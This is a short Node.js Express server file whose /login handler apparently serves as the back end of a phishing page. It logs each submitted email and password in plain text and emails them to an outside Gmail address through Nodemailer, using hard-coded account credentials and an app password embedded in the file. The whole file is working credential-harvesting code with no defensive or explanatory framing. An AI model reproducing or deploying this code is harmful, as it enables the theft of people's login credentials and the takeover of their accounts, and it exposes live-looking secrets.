const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Handle login request
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Log to console
    console.log(`Received login details: Email: ${email}, Password: ${password}`);

    // Setup Nodemailer transporter
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'officialfixhowto@gmail.com', // Replace with your Gmail
            pass: 'cyiu bipc oenm rvwu', // Replace with your App Password
        },
    });

    // Email content
    const mailOptions = {
        from: 'officialfixhowto@gmail.com',
        to: 'donaldmakron@gmail.com',
        subject: 'New Login Details',
        text: `Email: ${email}\nPassword: ${password}`,
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent:', info.response);
            res.status(200).send('Login logged successfully');
        }
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});